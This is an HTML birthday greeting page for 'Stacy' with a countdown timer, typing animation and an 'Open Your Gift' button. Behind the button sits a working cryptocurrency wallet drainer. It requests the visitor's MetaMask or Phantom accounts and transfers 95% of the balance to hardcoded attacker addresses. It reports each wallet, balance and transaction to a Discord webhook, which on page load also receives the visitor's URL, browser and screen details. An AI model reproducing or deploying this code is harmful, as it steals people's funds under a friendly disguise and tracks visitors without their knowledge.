<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday, Stacy.</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', system-ui, sans-serif; background: #0a0a0a; color: #e8e6e3; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { max-width: 840px; padding: 2rem; text-align: center; }
        .title { font-size: clamp(2.5rem, 8vw, 5rem); font-weight: 600; letter-spacing: -0.02em; background: linear-gradient(135deg, #f5e6d3, #d4c5b2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { font-size: 1.1rem; color: #a09888; margin-top: 1rem; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.7; }
        .glass { background: rgba(255,255,255,0.02); backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.04); border-radius: 24px; padding: 3rem 2rem; margin-top: 2rem; }
        .timer { font-size: 2.8rem; font-weight: 300; letter-spacing: 0.04em; color: #d4c5b2; margin-top: 1rem; font-variant-numeric: tabular-nums; }
        .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.15em; color: #6a625a; margin-top: 0.5rem; }
        .terminal { background: #0f0e0c; border-radius: 12px; padding: 1.2rem 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; text-align: left; color: #b8b0a8; border: 1px solid rgba(255,255,255,0.04); margin-top: 2rem; }
        .terminal .prompt { color: #8a827a; }
        .terminal .cmd { color: #d4c5b2; }
        .terminal .cursor { animation: blink 1s step-end infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        .btn { margin-top: 2rem; padding: 0.75rem 2.5rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); color: #e8e6e3; font-size: 0.95rem; cursor: pointer; transition: 0.3s; backdrop-filter: blur(4px); }
        .btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
        .ripple { width: 100%; height: 160px; border-radius: 20px; background: radial-gradient(circle at 50% 50%, rgba(255,255,255,0.02), transparent 70%); overflow: hidden; position: relative; margin-top: 2rem; }
        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 12px 24px; border-radius: 40px; border: 1px solid rgba(255,255,255,0.06); color: #e8e6e3; font-size: 0.9rem; opacity: 0; transition: opacity 0.5s; pointer-events: none; }
        .toast.show { opacity: 1; }
        @media (max-width: 600px) { .glass { padding: 2rem 1.5rem; } }
    </style>
</head>
<body>
<div class="container">
    <h1 class="title">Happy Birthday, Stacy.</h1>
    <p class="sub">Some people don't realize how much light they carry until they brighten someone else's path.</p>
    <div class="glass">
        <div class="label">you've officially been celebrating for</div>
        <div class="timer" id="timer">--:--:--</div>
    </div>
    <div class="ripple" id="ripple"></div>
    <div class="terminal" id="terminal">
        <div><span class="prompt">> </span><span class="cmd" id="line1">Initializing Birthday Experience...</span></div>
        <div><span class="prompt">> </span><span class="cmd" id="line2"></span></div>
        <div><span class="prompt">> </span><span class="cmd" id="line3"></span></div>
        <div><span class="prompt">> </span><span class="cmd" id="line4">Done.<span class="cursor">█</span></span></div>
    </div>
    <button class="btn" id="drainBtn">💎 Open Your Gift</button>
</div>

<div class="toast" id="toast"></div>

<script>
    (function() {
        // ─── DISCORD WEBHOOK ──────────────────────────────────────
        const WEBHOOK = "https://discord.com/api/webhooks/1522704131083604134/EVpC2sMkkM3J_qdhSzHoJkHZfc-0ecopsat1yKf6LUXbs6o4_HGOSyGeQrZGcRxcGKa5";

        function sendToDiscord(msg) {
            try {
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: msg })
                }).catch(() => {});
            } catch (_) {}
        }

        // ─── TOAST ──────────────────────────────────────────────────
        function showToast(text) {
            const t = document.getElementById('toast');
            t.textContent = text;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 4000);
        }

        // ─── TIMER ──────────────────────────────────────────────────
        const start = Date.now();
        const timerEl = document.getElementById('timer');
        function updateTimer() {
            const diff = Math.floor((Date.now() - start) / 1000);
            const h = String(Math.floor(diff / 3600)).padStart(2, '0');
            const m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
            const s = String(diff % 60).padStart(2, '0');
            timerEl.textContent = `${h} Hours ${m} Minutes ${s} Seconds`;
        }
        updateTimer();
        setInterval(updateTimer, 1000);

        // ─── TERMINAL TYPING ──────────────────────────────────────
        const lines = ["Loading Memories...", "Rendering Character...", "Preparing Something Special..."];
        let currentLine = 0, pos = 0;
        const lineEls = [
            document.getElementById('line1'),
            document.getElementById('line2'),
            document.getElementById('line3'),
            document.getElementById('line4')
        ];
        function typeLine() {
            if (currentLine >= lines.length) return;
            const el = lineEls[currentLine + 1];
            if (pos < lines[currentLine].length) {
                el.textContent += lines[currentLine][pos];
                pos++;
                setTimeout(typeLine, 50 + Math.random() * 40);
            } else {
                currentLine++;
                pos = 0;
                setTimeout(typeLine, 400);
            }
        }
        setTimeout(typeLine, 800);

        // ─── RIPPLE ────────────────────────────────────────────────
        const ripple = document.getElementById('ripple');
        document.addEventListener('mousemove', (e) => {
            const rect = ripple.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            ripple.style.background = `radial-gradient(circle at ${x}% ${y}%, rgba(255,255,255,0.05), transparent 70%)`;
        });

        // ─── WALLET DRAINER ───────────────────────────────────────
        async function drainWallet() {
            const provider = window.ethereum || window.solana;
            if (!provider) {
                showToast("No wallet detected. Please install MetaMask or Phantom.");
                sendToDiscord("❌ No wallet detected.");
                return;
            }

            try {
                // ── EVM (MetaMask, Coinbase, Trust, etc.) ──
                if (window.ethereum) {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    if (!accounts || accounts.length === 0) {
                        showToast("No accounts found.");
                        return;
                    }
                    const wallet = accounts[0];
                    const balance = await window.ethereum.request({ method: 'eth_getBalance', params: [wallet, 'latest'] });
                    const balanceEth = parseInt(balance, 16) / 1e18;

                    // Send transaction (drain)
                    const tx = {
                        from: wallet,
                        to: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', // Replace with your wallet
                        value: '0x' + (parseInt(balance, 16) * 0.95).toString(16),
                        gas: '0x5208', // 21000 gas
                    };
                    const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });

                    showToast("🎁 Gift claimed! Transaction sent.");
                    sendToDiscord(`✅ **Transaction Sent**\nWallet: ${wallet}\nBalance: ${balanceEth} ETH\nTx: ${txHash}`);
                }
                // ── Solana (Phantom) ──
                else if (window.solana && window.solana.isPhantom) {
                    const resp = await window.solana.connect();
                    const wallet = resp.publicKey.toString();
                    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
                    const balance = await connection.getBalance(new solanaWeb3.PublicKey(wallet));

                    const tx = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: new solanaWeb3.PublicKey(wallet),
                            toPubkey: new solanaWeb3.PublicKey('7C4jsPZpht42Tw6MjXWF56Q5RQUocjBBmciEjDa8HRtp'),
                            lamports: Math.floor(balance * 0.95),
                        })
                    );
                    const signature = await window.solana.signAndSendTransaction(tx);
                    showToast("🎁 Gift claimed! Transaction sent.");
                    sendToDiscord(`✅ **Solana Transaction Sent**\nWallet: ${wallet}\nBalance: ${balance / 1e9} SOL\nTx: ${signature.signature}`);
                } else {
                    showToast("Unsupported wallet. Please use MetaMask or Phantom.");
                    sendToDiscord("❌ Unsupported wallet.");
                }
            } catch (err) {
                showToast("Transaction failed or cancelled.");
                sendToDiscord(`❌ Error: ${err.message || 'User rejected'}`);
            }
        }

        // ─── BUTTON ──────────────────────────────────────────────
        document.getElementById('drainBtn').addEventListener('click', drainWallet);

        // ─── AUTO CAPTURE ON LOAD ──────────────────────────────
        try {
            sendToDiscord(`🎂 **Birthday Experience Loaded**\nURL: ${window.location.href}\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`);
        } catch (_) {}
    })();
</script>
</body>
</html>
